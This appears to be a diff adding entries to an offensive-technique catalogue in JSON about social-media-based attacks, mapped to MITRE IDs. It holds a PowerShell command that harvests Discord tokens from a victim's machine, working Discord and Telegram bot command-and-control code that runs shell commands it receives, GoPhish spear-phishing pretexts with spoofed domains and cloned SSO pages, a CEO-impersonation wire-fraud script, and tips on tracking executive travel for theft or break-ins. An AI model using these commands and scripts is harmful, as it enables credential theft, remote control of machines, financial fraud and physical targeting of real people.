+        "description": "Monitor LinkedIn for target employee movements \u2014 identify offboarding for credential abuse.",
+        "method": "Python",
+        "command": "import requests, time\n# Monitor employee departures \u2014 often accounts linger after offboarding:\n# 1. Track employees who update to 'Open to Work' or change company\n# 2. Identify recently departed employees who still have system access\n# 3. Spray credentials with leaked passwords for departed users\n# LinkedIn change monitoring:\ndef check_profile_changes(profile_url):\n    r = requests.get(profile_url, headers={'User-Agent': 'Mozilla/5.0'})\n    return hash(r.text)\n# Compare hash daily \u2014 change = position update = potential offboarding"
+      }
+    ],
+    "prerequisites": "LinkedIn account; target company identified; OSINT tools (LinkedIn2Username, etc.)",
+    "opsec": "Premium InMail avoids connection requirement. Harvesting employee names via LinkedIn enables password spraying and spear phishing.",
+    "detection_ref": "LinkedIn profile view limits; export data detection; company security awareness; employee profile minimization policies"
+  },
+  "corporate_executive_targeting": {
+    "description": "Targeting executives, high-value employees, and corporate infrastructure via social media for initial access, intelligence, or fraud.",
+    "mitre": "T1598",
+    "commands": [
+      {
+        "description": "Full executive attack surface mapping across all social platforms.",
+        "method": "SpiderFoot + Maigret",
+        "command": "# SpiderFoot sweep:\npython3 sf.py -s {exec_email} -m sfp_linkedin,sfp_social,sfp_accounts,sfp_emailrep -o TDF\n# Maigret on discovered usernames:\npython3 -m maigret {username} --html\n# Correlate: hobbies, family members, travel patterns, personal accounts"
+      },
+      {
+        "description": "LinkedIn executive spear phishing \u2014 department-specific pretext matching role.",
+        "method": "GoPhish",
+        "command": "# Role-specific pretexts:\n# IT: 'New VPN client mandatory update by Friday: {phish_link}'\n# Finance: 'Urgent: wire transfer approval required \u2014 CEO request'\n# HR: 'Employee benefits portal migration \u2014 re-authenticate: {phish_link}'\n# Deploy via GoPhish with sender domain spoofing: helpdesk@{target_domain}.com\n# Landing page: cloned Azure AD / Okta SSO portal"
+      },
+      {
+        "description": "Extract corporate credentials from GitHub repositories via Google dorks.",
+        "method": "GitDorker",
+        "command": "python3 gitdorker.py -t {github_token} -q {target_domain} -d dorks/corporate.txt\n# Also:\n# site:github.com {target_domain} password\n# site:pastebin.com {target_domain} apikey\n# site:gist.github.com {target_domain} secret"
+      },
+      {
+        "description": "Identify executive travel patterns from social media for physical attack timing.",
+        "method": "OSINT",
+        "command": "# Travel pattern OSINT:\n# Twitter: twint -u {exec_twitter} | grep -i 'hotel|flight|arrived|landed|conference|excited to be in'\n# Instagram: scrape location tags and check-ins via Instaloader\n# LinkedIn: look for conference attendance posts and office location changes\n# Use case:\n# - Physical access to unguarded office while exec travels\n# - Impersonation: 'I am traveling, please wire funds to new account'\n# - Opportunistic laptop theft at hotel or airport"
+      },
+      {
+        "description": "WhatsApp BEC \u2014 impersonate CEO to trigger unauthorized wire transfer.",
+        "method": "Manual",
+        "command": "# BEC via WhatsApp:\n# 1. OSINT: get exec's WhatsApp photo from LinkedIn/Twitter\n# 2. Use same photo and similar display name\n# 3. Message CFO or finance team:\n# 'Hi, in confidential merger meeting, phone on silent.\n# Process urgent vendor payment: $X to {account details}. Confirm when done.'\n# Why effective: WhatsApp feels personal/trusted, less scrutiny than email"
+      },
+      {
+        "description": "Glassdoor intel mining \u2014 identify security tools, vulnerabilities, org structure.",
+        "method": "Python",
+        "command": "import requests\nheaders = {'User-Agent': 'Mozilla/5.0'}\n# Mine Glassdoor reviews mentioning: VPN, security, tools, vulnerabilities\nr = requests.get(f'https://www.glassdoor.com/Reviews/{company}-Reviews-E{id}.htm', headers=headers)\n# Also scrape LinkedIn posts mentioning internal tools, vendors, org changes\n# Intel use: software versions deployed, unpatched vulnerabilities, internal processes"
+      }
+    ],
+    "prerequisites": "Target executive identified via LinkedIn/OSINT; tailored pretext; appropriate delivery channel",
+    "opsec": "High-value targets have greater security awareness. Use insider knowledge from OSINT to make approach credible. BEC via email or Zoom impersonation.",
+    "detection_ref": "Executive protection monitoring; financial authorization out-of-band verification; impersonation detection in email gateways; security awareness for executives"
+  },
+  "discord_telegram_c2_social": {
+    "description": "Abuse Discord and Telegram as C2 channels and social engineering vectors \u2014 bot token theft, DM phishing, and covert command execution.",
+    "mitre": "T1102.002",
+    "commands": [
+      {
+        "description": "Extract Discord token from victim Windows machine local storage",
+        "command": "Get-ChildItem -Path \"$env:APPDATA\\discord\\Local Storage\\leveldb\" -Filter '*.ldb' | Select-String -Pattern 'mfa\\.[a-zA-Z0-9_-]+'",
+        "method": "PowerShell"
+      },
+      {
+        "description": "Validate stolen Discord token",
+        "command": "curl -s 'https://discord.com/api/v10/users/@me' -H 'Authorization: <TOKEN>'",
+        "method": "curl/Discord API"
+      },
+      {
+        "description": "Use Discord bot as C2 \u2014 receive commands, send output",
+        "command": "import discord, subprocess\nclient = discord.Client(intents=discord.Intents.all())\n@client.event\nasync def on_message(msg):\n    if msg.author == client.user: return\n    if msg.content.startswith('!cmd '):\n        out = subprocess.check_output(msg.content[5:], shell=True)\n        await msg.channel.send(f'```{out.decode()}```')\nclient.run('BOT_TOKEN')",
+        "method": "Python/Discord"
+      },
+      {
+        "description": "Telegram bot C2 \u2014 receive commands, send output",
+        "command": "import telebot, subprocess\nbot = telebot.TeleBot('BOT_TOKEN')\n@bot.message_handler(commands=['cmd'])\ndef run_cmd(msg):\n    cmd = msg.text.replace('/cmd ', '')\n    out = subprocess.check_output(cmd, shell=True)\n    bot.reply_to(msg, out.decode())\nbot.polling()",
+        "method": "Python/Telegram"
+      },
+      {
+        "description": "DM phishing via Discord \u2014 send malicious link to server members",
+        "command": "# Using stolen user token, open DM channel then send phishing link:\ncurl -s -X POST 'https://discord.com/api/v10/users/@me/channels' -H 'Authorization: <USER_TOKEN>' -H 'Content-Type: application/json' -d '{\"recipient_id\": \"<TARGET_USER_ID>\"}'",
+        "method": "curl/Discord API"
+      }
+    ],
+    "prerequisites": "Discord bot token or Telegram bot API; target server/group access",
+    "opsec": "Discord/Telegram as C2 blends with legitimate collaboration traffic. Encrypted Telegram channels are stealthy. Discord webhooks for data exfiltration.",
+    "detection_ref": "Network proxy blocking Discord/Telegram in corporate environments; DLP monitoring for data exfil patterns; endpoint behavioral detection"
+  }
+}
